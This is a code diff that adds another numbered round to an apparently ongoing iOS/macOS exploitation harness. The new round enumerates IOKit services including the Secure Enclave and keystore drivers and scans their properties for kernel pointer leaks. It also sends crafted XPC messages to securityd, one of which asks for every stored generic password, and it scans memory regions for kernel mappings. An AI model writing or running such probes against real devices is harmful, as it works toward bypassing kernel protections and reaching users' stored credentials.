@@ -12960,6 +12960,283 @@ static void r333_probe(void) {
     fflush(stdout);
 }
 
+/* r334: IOKit notification object exploitation + securityd XPC with proper keychain params
+   r333: trustd all empty, securityd all paramErr, containermanagerd all error72.
+   IOKit notifs gave handles: IOService(5), IOUserClient(5), AppleSEPManager(1), AKS(1).
+   Strategy: query matched objects for properties/class/kptrs. Try securityd with real
+   keychain query params. Try IOUserClient external methods via matched handles. */
+static void r334_probe(void) {
+    rlog("\n=== r334: IOKit Object Exploitation + Keychain Query ===\n");
+    rlog("  r333: IOKit notif matched objects, XPC two-way confirmed.\n");
+    rlog("  Strategy: deep object query, external methods, keychain params.\n\n");
+    fflush(stdout);
+
+    rlog("--- Part 1: IOKit notification matched object deep probe ---\n");
+    fflush(stdout);
+    {
+        mach_port_t master_port = kIOMainPortDefault;
+        IONotificationPortRef notif_ref = IONotificationPortCreate(master_port);
+        if (!notif_ref) { rlog("  notif_ref=NULL\n"); goto p1_done; }
+
+        const char *classes[] = {
+            "IOService", "IOUserClient", "AppleSEPManager",
+            "AppleKeyStore", "IOSurfaceRoot", "AppleAVE2Driver",
+            "IOHIDSystem", "AppleCredentialManager",
+            NULL
+        };
+
+        for (int ci = 0; classes[ci]; ci++) {
+            CFMutableDictionaryRef matching = IOServiceMatching(classes[ci]);
+            if (!matching) continue;
+            io_iterator_t iter = 0;
+            kern_return_t kr = IOServiceAddMatchingNotification(
+                notif_ref, kIOFirstMatchNotification, matching,
+                NULL, NULL, &iter);
+            if (kr != KERN_SUCCESS || !iter) {
+                rlog("  %s: notif kr=0x%x\n", classes[ci], kr);
+                continue;
+            }
+
+            io_object_t obj;
+            int count = 0;
+            while ((obj = IOIteratorNext(iter)) && count < 10) {
+                io_name_t name = {0};
+                io_name_t cls = {0};
+                IOObjectGetClass(obj, cls);
+                IORegistryEntryGetName(obj, name);
+
+                rlog("  [%s] obj=0x%x class='%s' name='%s'\n",
+                     classes[ci], obj, cls, name);
+
+                /* get all properties */
+                CFMutableDictionaryRef props = NULL;
+                kr = IORegistryEntryCreateCFProperties(obj, &props, kCFAllocatorDefault, 0);
+                if (kr == 0 && props) {
+                    CFIndex pcnt = CFDictionaryGetCount(props);
+                    rlog("    properties: %ld keys\n", (long)pcnt);
+
+                    /* dump all keys and check values for kptrs */
+                    CFIndex n = CFDictionaryGetCount(props);
+                    if (n > 0 && n < 100) {
+                        const void *keys[100], *vals[100];
+                        CFDictionaryGetKeysAndValues(props, keys, vals);
+                        for (CFIndex k = 0; k < n && k < 100; k++) {
+                            char kbuf[256] = {0};
+                            if (CFGetTypeID(keys[k]) == CFStringGetTypeID()) {
+                                CFStringGetCString(keys[k], kbuf, sizeof(kbuf), kCFStringEncodingUTF8);
+                            }
+
+                            CFTypeID tid = CFGetTypeID(vals[k]);
+                            if (tid == CFNumberGetTypeID()) {
+                                int64_t v = 0;
+                                CFNumberGetValue(vals[k], kCFNumberSInt64Type, &v);
+                                uint64_t uv = (uint64_t)v;
+                                rlog("    '%s' = 0x%llx (%lld)\n", kbuf, (unsigned long long)uv, (long long)v);
+                                if (uv > 0xffff000000000000ULL && uv != 0xffffffffffffffffULL) {
+                                    rlog("      !!! KPTR CANDIDATE !!!\n");
+                                }
+                            } else if (tid == CFStringGetTypeID()) {
+                                char vbuf[512] = {0};
+                                CFStringGetCString(vals[k], vbuf, sizeof(vbuf), kCFStringEncodingUTF8);
+                                rlog("    '%s' = '%s'\n", kbuf, vbuf);
+                            } else if (tid == CFDataGetTypeID()) {
+                                CFIndex len = CFDataGetLength(vals[k]);
+                                rlog("    '%s' = <data %ld bytes>", kbuf, (long)len);
+                                if (len > 0 && len <= 64) {
+                                    const uint8_t *bytes = CFDataGetBytePtr(vals[k]);
+                                    rlog(" hex=");
+                                    for (CFIndex b = 0; b < len && b < 64; b++)
+                                        rlog("%02x", bytes[b]);
+                                    /* scan for 8-byte aligned kptrs in data */
+                                    for (CFIndex b = 0; b + 8 <= len; b += 8) {
+                                        uint64_t dv;
+                                        memcpy(&dv, bytes + b, 8);
+                                        if (dv > 0xffff000000000000ULL && dv != 0xffffffffffffffffULL) {
+                                            rlog("\n      !!! DATA KPTR at +%ld: 0x%llx !!!",
+                                                 (long)b, (unsigned long long)dv);
+                                        }
+                                    }
+                                }
+                                rlog("\n");
+                            } else if (tid == CFBooleanGetTypeID()) {
+                                rlog("    '%s' = %s\n", kbuf,
+                                     CFBooleanGetValue(vals[k]) ? "true" : "false");
+                            } else {
+                                rlog("    '%s' = <type %lu>\n", kbuf, (unsigned long)tid);
+                            }
+                        }
+                    }
+                    CFRelease(props);
+                } else {
+                    rlog("    props: kr=0x%x\n", kr);
+                }
+
+                /* try to get registry entry ID (might leak kernel info) */
+                uint64_t entry_id = 0;
+                kr = IORegistryEntryGetRegistryEntryID(obj, &entry_id);
+                rlog("    entryID: kr=0x%x id=0x%llx\n", kr, (unsigned long long)entry_id);
+
+                /* check parent/child relationships */
+                io_registry_entry_t parent = 0;
+                kr = IORegistryEntryGetParentEntry(obj, kIOServicePlane, &parent);
+                if (kr == KERN_SUCCESS && parent) {
+                    io_name_t pname = {0}, pcls = {0};
+                    IOObjectGetClass(parent, pcls);
+                    IORegistryEntryGetName(parent, pname);
+                    rlog("    parent: class='%s' name='%s'\n", pcls, pname);
+                    IOObjectRelease(parent);
+                }
+
+                IOObjectRelease(obj);
+                count++;
+            }
+            rlog("  %s: %d objects matched\n\n", classes[ci], count);
+            fflush(stdout);
+        }
+        IONotificationPortDestroy(notif_ref);
+    }
+    p1_done:
+    fflush(stdout);
+
+    rlog("--- Part 2: securityd with proper keychain query ---\n");
+    fflush(stdout);
+    {
+        void *libxpc = dlopen("/usr/lib/system/libxpc.dylib", RTLD_NOW);
+        typedef void* (*xpc_conn_create_t)(const char *, dispatch_queue_t, uint64_t);
+        typedef xpc_object_t (*xpc_conn_send_sync_t)(xpc_connection_t, xpc_object_t);
+        xpc_conn_create_t xpc_create = dlsym(libxpc, "xpc_connection_create_mach_service");
+        xpc_conn_send_sync_t xpc_send_sync = dlsym(libxpc, "xpc_connection_send_message_with_reply_sync");
+
+        if (xpc_create && xpc_send_sync) {
+            xpc_connection_t conn = xpc_create("com.apple.securityd", NULL, 0);
+            if (conn) {
+                xpc_connection_set_event_handler(conn, ^(xpc_object_t event) { (void)event; });
+                xpc_connection_resume(conn);
+
+                /* try with real SecItemCopyMatching params */
+                xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
+                xpc_dictionary_set_string(msg, "operation", "SecItemCopyMatching");
+
+                /* build a query dict inside XPC */
+                xpc_object_t query = xpc_dictionary_create(NULL, NULL, 0);
+                xpc_dictionary_set_string(query, "class", "genp"); /* generic password */
+                xpc_dictionary_set_string(query, "r_Attributes", "1");
+                xpc_dictionary_set_string(query, "m_Limit", "m_LimitAll");
+                xpc_dictionary_set_value(msg, "query", query);
+
+                xpc_object_t reply = xpc_send_sync(conn, msg);
+                if (reply) {
+                    char *desc = xpc_copy_description(reply);
+                    rlog("  SecItemCopyMatching(genp): %s\n", desc ? desc : "?");
+                    if (desc) {
+                        /* scan for kptrs in full reply */
+                        char *p = desc;
+                        while ((p = strstr(p, "0x"))) {
+                            uint64_t v = strtoull(p, NULL, 16);
+                            if (v > 0xffff000000000000ULL && v != 0xffffffffffffffffULL) {
+                                rlog("    !!! KPTR: 0x%llx\n", (unsigned long long)v);
+                            }
+                            p += 2;
+                        }
+                        free(desc);
+                    }
+                }
+
+                /* try SecTrustEvaluate with actual cert data */
+                xpc_object_t msg2 = xpc_dictionary_create(NULL, NULL, 0);
+                xpc_dictionary_set_string(msg2, "operation", "SecTrustEvaluate");
+                /* send self-signed test cert data - 0 bytes triggers different code path */
+                uint8_t fake_cert[32];
+                memset(fake_cert, 0x41, sizeof(fake_cert));
+                xpc_dictionary_set_data(msg2, "certificates", fake_cert, sizeof(fake_cert));
+                xpc_dictionary_set_uint64(msg2, "domain", 1);
+                xpc_dictionary_set_bool(msg2, "returnsChain", true);
+
+                xpc_object_t reply2 = xpc_send_sync(conn, msg2);
+                if (reply2) {
+                    char *desc = xpc_copy_description(reply2);
+                    rlog("  SecTrustEvaluate(fakecert): %s\n", desc ? desc : "?");
+                    if (desc) {
+                        char *p = desc;
+                        while ((p = strstr(p, "0x"))) {
+                            uint64_t v = strtoull(p, NULL, 16);
+                            if (v > 0xffff000000000000ULL && v != 0xffffffffffffffffULL) {
+                                rlog("    !!! KPTR: 0x%llx\n", (unsigned long long)v);
+                            }
+                            p += 2;
+                        }
+                        free(desc);
+                    }
+                }
+
+                /* try SOSCCThisDeviceIsInCircle with accessor param */
+                xpc_object_t msg3 = xpc_dictionary_create(NULL, NULL, 0);
+                xpc_dictionary_set_string(msg3, "operation", "SOSCCThisDeviceIsInCircle");
+                xpc_dictionary_set_uint64(msg3, "domain", 0);
+                xpc_dictionary_set_bool(msg3, "wait", false);
+
+                xpc_object_t reply3 = xpc_send_sync(conn, msg3);
+                if (reply3) {
+                    char *desc = xpc_copy_description(reply3);
+                    rlog("  SOSCCThisDeviceIsInCircle: %s\n", desc ? desc : "?");
+                    if (desc) free(desc);
+                }
+
+                xpc_connection_cancel(conn);
+            }
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n--- Part 3: vm_region_recurse scan for kernel map entries ---\n");
+    fflush(stdout);
+    {
+        uint64_t addr = 0;
+        uint64_t size = 0;
+        uint32_t depth = 0;
+        vm_region_submap_info_data_64_t info;
+        mach_msg_type_number_t cnt;
+        int region_count = 0;
+        int interesting = 0;
+
+        while (region_count < 2000) {
+            cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            depth = 100;
+            kern_return_t kr = mach_vm_region_recurse(mach_task_self(),
+                &addr, &size, &depth, (vm_region_recurse_info_t)&info, &cnt);
+            if (kr != KERN_SUCCESS) break;
+
+            /* look for unusual regions — kernel-mapped pages, shared memory */
+            if (info.share_mode == SM_TRUESHARED || info.share_mode == SM_SHARED_ALIASED) {
+                rlog("  shared region 0x%llx-0x%llx mode=%d depth=%d obj_id=%d\n",
+                     (unsigned long long)addr, (unsigned long long)(addr+size),
+                     info.share_mode, depth, info.object_id);
+                /* check if object_id looks like a kernel pointer */
+                if (info.object_id > 0xffff0000) {
+                    rlog("    !!! HIGH OBJ_ID: 0x%x !!!\n", info.object_id);
+                    interesting++;
+                }
+            }
+
+            /* check user_tag for interesting kernel-mapped regions */
+            if (info.user_tag >= 30 && info.user_tag <= 50) {
+                rlog("  kern-tagged 0x%llx-0x%llx tag=%d share=%d obj=%d\n",
+                     (unsigned long long)addr, (unsigned long long)(addr+size),
+                     info.user_tag, info.share_mode, info.object_id);
+                interesting++;
+            }
+
+            addr += size;
+            region_count++;
+        }
+        rlog("  Scanned %d regions, %d interesting\n", region_count, interesting);
+    }
+    fflush(stdout);
+
+    rlog("\n=== r334 complete ===\n");
+    fflush(stdout);
+}
+
 /* r332: XPC-based service probing + containermanagerd/installd reply capture
    r331: securityd/trustd accept all MIG IDs (one-way), rpc crashes.
    Try XPC API for proper bidirectional communication + probe services
@@ -44099,6 +44376,13 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 336) {
+            rlog("*** rounds=336: IOKit Object Exploitation + Keychain Query ***\n");
+            rlog("  r333: IOKit notifs matched real objects. XPC trustd=empty.\n");
+            rlog("  Probe: deep object properties, registry IDs, keychain, vm_region.\n\n");
+            r334_probe();
             goto done;
         }
         if (rounds == 335) {
